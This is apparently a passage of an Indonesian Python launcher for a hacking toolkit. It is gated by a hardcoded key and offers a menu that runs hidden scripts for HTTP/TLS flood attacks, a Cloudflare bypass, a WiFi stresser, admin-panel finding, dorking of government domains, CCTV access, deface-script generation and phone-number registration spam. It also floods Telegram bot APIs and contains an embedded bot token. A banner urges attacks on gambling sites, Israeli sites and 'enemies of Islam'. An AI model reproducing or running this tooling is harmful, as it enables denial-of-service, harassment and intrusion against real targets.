#\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m32\033[1;31m]\033[1;34m ║\033[0m \033[1;36mYOUTUBE DOWNLOADER                              \033[48;5;17m\033[1;34m ║\033[0m

def logo2():
     print (f"""\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣏⠉⠉⠉⠉⠉⠉⢡⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠈⣿⣿⣿⣿⣦⣽⣦⡀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠀
⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠇⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⡟⢿⠻⠛⠙⠉⠋⠛⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢿⡇⣠⣤⣶⣶⣾⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⢇⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⢤⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣬⣭⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣠⣴⣾⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣘⡛⠿⢿⡿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠿⠛⠉⠁⠀⠈⠉⠙⠛⠛⠻⠿⠿⠿⠿⠟⠛⠃⠀⠀⠀⠉⠉⠉⠛⠛⠛⠿⠿⠿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
 \033[1;34m██████\033[1;31m╗    \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╗   \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗
 \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m║ \033[1;34m██\033[1;31m╔╝           ╚\033[1;34m██\033[1;31m╗\033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m███████\033[1;31m║  \033[1;34m██████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╔╝   \033[1;34m███████\033[1;31m╗  ╚\033[1;34m███\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔═\033[1;34m██\033[1;31m╗   ╚══════╝  \033[1;34m██\033[1;31m╔\033[1;34m██\033[1;31m╗
 \033[1;34m██████\033[1;31m╔╝  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╗
 \033[1;31m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝           ╚═╝  ╚═╝
\033[1;34m╔═════════════════════════════════════════════════════════╗
║                         \033[1;31mLICENSE                         \033[1;34m║
╚═════════════════════════════════════════════════════════╝""")

os.system("cls" if os.name == "nt" else "clear")
def simpan_password(password):
    with open('.login.txt', 'w') as file:
        file.write(password)
def cek_login():
    try:
        with open('.login.txt', 'r') as file:
            password = file.read()
            return password
    except FileNotFoundError:
        return None
def login():
    stored_password = cek_login()
    if stored_password is not None and stored_password == 'SHDW-HDWS-DWSH-WSHD':
        os.system("cls" if os.name == "nt" else "clear")
        logo()
    else:
        logo2()
        input_password = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKey        \033[1;31m: \033[0;37m")
        loading()
        if input_password == 'SHDW-HDWS-DWSH-WSHD':
            simpan_password(input_password)
            print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;32mKey Valid!")
            sleep(3)
            os.system("cls" if os.name == "nt" else "clear")
            logo()
        else:
            print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;31mKey Invalid!")
            if os.name == "posix":
               os.system("xdg-open https://wa.me/6283141494320")
            elif os.name == "nt":
               os.system("start https://wa.me/6283141494320")
            quit()
if os.path.exists('.login.txt'):
    login()
else:
    logo2()
    password = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKey        \033[1;31m: \033[0;37m")
    loading()
    if password == 'SHDW-HDWS-DWSH-WSHD':
        simpan_password(password)
        print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;32mKey Valid!")
        sleep(2)
        os.system("cls" if os.name == "nt" else "clear")
        logo()
    else:
        print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;31mKey Invalid!")
        if os.name == "posix":
           os.system("xdg-open https://wa.me/6283141494320")
        elif os.name == "nt":
           os.system("start https://wa.me/6283141494320")
        sys.exit(0)
while True:
    try:
        message = input("\033[1;34m┌──(\033[1;31mdark-x㉿localhost\033[1;34m)-[\033[1;37m~\033[1;34m]\n└─\033[1;31m#\033[1;37m ")
        if message.strip():
            if message == "0" or message == "00":
                print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
                print()
                break
            elif message == "1" or message == "01":
                os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                print("""\033[1;34m
 \033[1;34m██\033[1;31m╗       \033[1;34m█████\033[1;31m╗  \033[1;34m██\033[1;31m╗   \033[1;34m██\033[1;31m╗ \033[1;34m███████\033[1;31m╗ \033[1;34m██████\033[1;31m╗     \033[1;34m███████\033[1;31m╗
 \033[1;34m██\033[1;31m║      \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗ ╚\033[1;34m██\033[1;31m╗ \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╔════╝ \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗    ╚════\033[1;34m██\033[1;31m║
 \033[1;34m██\033[1;31m║      \033[1;34m███████\033[1;31m║  ╚\033[1;34m████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╔╝        \033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║      \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║   ╚\033[1;34m██\033[1;31m╔╝   \033[1;34m██\033[1;31m╔══╝   \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗       \033[1;34m██\033[1;31m╔╝
 \033[1;34m███████\033[1;31m╗ \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║    \033[1;34m██\033[1;31m║    \033[1;34m███████\033[1;31m╗ \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║       \033[1;34m██\033[1;31m║
 \033[1;31m╚══════╝ ╚═╝  ╚═╝    ╚═╝    ╚══════╝ ╚═╝  ╚═╝       ╚═╝  
""")
                print('''                       \033[1;31mWARNING!!!
 DIMOHON KESADARANNYA UNTUK TIDAK MENARGETKAN WEB SEKOLAH,
 PEMERINTAH, DAN LAINNYA. KECUALI WEB SLOT, BOK*B, ISRAEL,
 DAN MUSUH-MUSUH ISLAM LAINNYA. KARENA SESUNGGUHNYA TUHAN
          MAHA MELIHAT APA YANG KAMU PERBUAT.
''')
                print(" \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mHTTPv1")
                print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mHTTPv2 \033[1;31m(new)")
                print(" \033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mHTTPv3")
                print(" \033[1;31m[\033[1;37m4\033[1;31m] \033[1;36mMix")
                print(" \033[1;31m[\033[1;37m5\033[1;31m] \033[1;36mCF Bypass")
                print(" \033[1;31m[\033[1;37m6\033[1;31m] \033[1;36mTLSv1")
                print(" \033[1;31m[\033[1;37m7\033[1;31m] \033[1;36mTLSv2")
                print(" \033[1;31m[\033[1;37m8\033[1;31m] \033[1;36mTLSv3")
                print(" \033[1;31m[\033[1;37m9\033[1;31m] \033[1;36mProxy Scrape")
                print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMethod \033[1;36m: \033[1;37m")
                if pilihan.endswith("1"):
                    httpv1()
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("274687526"):
                    sleep(1)
                    url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        os.system(f"python3.11 .data/.f {url}")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("2"):
                    os.system(f"python3.11 .data/.n")
                    wait = input("\n\033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("3"):
                    sleep(1)
                    httpv3()
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("4"):
                    sleep(1)
                    os.system("python3.11 .data/.m")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("5"):
                    sleep(1)
                    url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        time = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTime \033[1;31m(ex. 60) \033[1;36m: \033[0;37m")
                        print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPress Ctr+C to stop the attack\n")
                        os.system(f"node cfb.js {url} {time}")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("6"):
                    sleep(1)
                    url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        req = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequest/s \033[1;31m(ex. 200) \033[1;36m: \033[0;37m")
                        th = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThread \033[1;31m(ex. 100) \033[1;36m: \033[0;37m")
                        time = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTime \033[1;31m(ex. 60) \033[1;36m: \033[0;37m")
                        print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPress Ctr+Z to stop the attack\n")
                        os.system(f"node tlsv1.js {url} {time} {req} {th} proxy.txt")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("7"):
                    sleep(1)
                    #print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCukup memakan RAM & Disarankan tidak menggunakan HP kentang")
                    url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        req = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequest/s \033[1;31m(ex. 200) \033[1;36m: \033[0;37m")
                        th = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThread \033[1;31m(ex. 100) \033[1;36m: \033[0;37m")
                        time = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTime \033[1;31m(ex. 60) \033[1;36m: \033[0;37m")
                        os.system(f"node tlsv2.js {url} {time} {req} {th} proxy.txt")
                        wait = input("\n\033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("8"):
                    sleep(1)
                    #print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCukup memakan RAM & Disarankan tidak menggunakan HP kentang")
                    url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        req = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequest/s \033[1;31m(ex. 200) \033[1;36m: \033[0;37m")
                        th = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThread \033[1;31m(ex. 100) \033[1;36m: \033[0;37m")
                        time = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTime \033[1;31m(ex. 60) \033[1;36m: \033[0;37m")
                        print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPress Ctr+C to stop the attack\n")
                        os.system(f"node tlsv3.js {url} {time} {req} {th} proxy.txt")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("9"):
                    sleep(1)
                    os.system("python3.11 .data/.p")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "2" or message == "02":
                sleep(1)
                #os.system("cls" if os.name == "nt" else "clear")
                os.system("python3.11 .data/.u")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "3" or message == "03":
                os.system("cls" if os.name == "nt" else "clear")
                os.system("python3.11 .data/.g")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "4" or message == "04":
                sleep(1)
                os.system("python3.11 .data/.o")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "63782252552" or message == "25279353838":
                sleep(1)
                print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mStart Wifi Stresser")
                print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[1;37m")
                if pilihan.endswith("1"):
                    sleep(1)
                    os.system("node .b")
                    wait = input("\n\033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    #print("\033[1;31mInvalid options...!!!")
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "694964867355":
                sleep(1)
                admin_finder()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "5" or message == "05":
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                os.system("python3.11 .data/.q")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "6" or message == "06":
                sleep(1)
                print("\033[0mTutorial:")
                print("1. Isi password ssh \033[1;31m(segfault)\033[0m lalu enter")
                print("2. Tekan enter lalu tunggu 1 menit")
                print("3. Langsung tekan enter lagi (jangan sampai terlambat)")
                print("4. Selesai, Anda sudah bisa mengakses Kali Linux secara\n   virtual di termux")
                print("5. Masukkan perintah \033[1;31m(exit)\033[0m utk menghentikan")
                print("6. Jika ingin menyimpan data, silakan copy token yg ada\n   di terminal dan paste di termux utk mengakses ulang")
                print('\nContoh: \033[1;31mssh -o "SetEnvnTgzVSCJLKOvIXRZOCZgWllC" root@lulz.segfault.net\n')
                print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mPlease wait...\033[0m")
                os.system("ssh root@segfault.net")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "7" or message == "07":
                sleep(1)
                print("\033[0mTutorial:")
                print("1. Klik tombol \033[1;31m(I'm new here)\033[0m & simpan tokennya jika perlu")
                print("2. Tekan enter lalu tunggu 1 menit")
                print("3. Langsung tekan enter lagi (jangan sampai terlambat)")
                print("4. Selesai, Anda sudah bisa mengakses Kali Linux secara\n   virtual menggunakan browser")
                #print("5. Jika ingin menyimpan data silakan copy & simpan token anda di tempat yg aman")
                sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://shell.segfault.net/#/dashboard")
                elif os.name == "nt":
                    os.system("start https://shell.segfault.net/#/dashboard")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "8" or message == "08":
                sleep(1)
                target = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDomain Target \033[1;31m(ex. kpu.go.id) \033[1;36m: \033[0;37m")
                filetype = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mFiletype \033[1;31m(ex. pdf,xlsx,docx,csv/all) \033[1;36m: \033[0;37m")
                page = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah Halaman \033[1;31m(ex. 3) \033[1;36m: \033[0;37m")
                os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                os.system(f"bash .data/.h -t {target} -e {filetype} -p {page}")
                print("")
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "9" or message == "09":
                sleep(1)
                url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL Target \033[1;31m(ex. https://kpu.go.id) \033[1;36m: \033[0;37m")
                limit = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah Pencarian \033[1;31m(ex. 3) \033[1;36m: \033[0;37m")
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                os.system(f"python3.11 .data/.e -d {url} -b {limit}")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "10":
                #os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                ig()
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "11":
                #os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                ip_track()
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "12":
                sleep(1)
                #Tambahkan kalo mau pake server openai
                #print("\033[1;34mNote \033[1;31m: \033[0;37mJika API Key expired, \nBuatlah API Key di \033[1;31mhttps://platform.openai.com/api-keys\n\033[0;37mKalo ga bisa login dulu, baru akses lagi link nya.")
                os.system("cls" if os.name == "nt" else "clear")
                shadow_gpt()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "13":
                sleep(1)
                print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mUbah Tampilan Termux")
                print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mReset Tampilan Termux")
                print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[1;37m")
                if pilihan.endswith("1"):
                    sleep(1)
                    termux_banner()
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    sleep(1)
                    os.system("cp .data/.sh1 $HOME/../usr/etc/bash.bashrc")
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mSelesai")
                    sleep(0.5)
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKetik \033[1;31mlogin \033[1;34muntuk mencoba!")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "14":
                sleep(1)
                #os.system("cls" if os.name == "nt" else "clear")
                os.system("python2 .data/.b")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "15":
                sleep(1)
                username = input("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan Username \033[1;31m: \033[0;37m")
                os.system("cls" if os.name == "nt" else "clear")
                os.system(f"python3.11 .data/.s --search {username}")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "16":
                print("\033[1;34mNote\033[1;31m: \033[0;37mDimohon kesadarannya utk tdk menyalahgunakan tool ini")
                print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mPlease wait...")
                os.system("bash .data/.i")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "825252782255":
                sleep(1)
                print("\n\033[1;31mTips :")
                print("1. Regisrasi pake nomor target (08xxx)\n2. Isi captcha\n3. Klik daftar\n4. Selesai")
                sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://www.traveloka.com/id-id/user/signin")
                elif os.name == "nt":
                    os.system("start https://www.traveloka.com/id-id/user/signin")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "17":
                sleep(1)
                email_sender()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "18":
                sleep(1)
                print(" \033[1;34mNote\033[1;31m: \033[0;37mJika anda menerima virus berbentuk undangan APK atau\n sejenisnya, silakan bongkar dan lihat source-nya lalu copy\n API telegram si penipu untuk di spam bug hingga mati.")
                def start_spam():
                    sleep(1)
                    print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mMulai Spam")
                    print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mGanti Target")
                    print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
                    pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[1;37m")
                    if pilihan.endswith("1"):
                        print("\033[0;37m")
                        os.system("node .a")
                    elif pilihan.endswith("2"):
                        def replace_text_in_first_line(input_file, output_file, new_text):
                            with open(input_file, 'r') as file:
                                lines = file.readlines()
                            lines[0] = new_text + '\n'
                            with open(output_file, 'w') as file:
                                file.writelines(lines)
                        input_file = 'urls.txt'
                        output_file = 'urls.txt'
                        sleep(1)
                        print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mContoh API telegram \033[1;31m: \033[0;37mhttps://api.telegram.org/bot6857276354:AAH98ElI1j81M3c3KlcxoqIMzTX6H_EAIFA/sendMessage?parse_mode=markdown&chat_id=6310342995&text=")
                        sleep(0.3)
                        new_text = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan API target \033[1;31m: \033[0;37m")
                        replace_text_in_first_line(input_file, output_file, new_text)
                        print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget Telah Di Ganti")
                        start_spam()
                    else:
                        sleep(1)
                start_spam()
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "19":
                os.system("node .c")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "20":
                os.system("node .d")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "21":
                sleep(1)
                os.system("php .data/.v")
                wait = input("\n\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "22":
                sleep(1)
                #insta_followers()
                os.system("python3.11 .data/.a")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "23":
                sleep(1)
                os.system("python3.11 .data/.l")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "24":
                os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                cctv()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "25":
                os.system("cls" if os.name == "nt" else "clear")
                cctv2()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "26":
                sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://script-deface-generator.prinsh.com/")
                elif os.name == "nt":
                    os.system("start https://script-deface-generator.prinsh.com/")
                sleep(2)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "726528386":
                sleep(1)
                kota = input("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mLokasi/Kota \033[1;31m: \033[0;37m")
                print("")
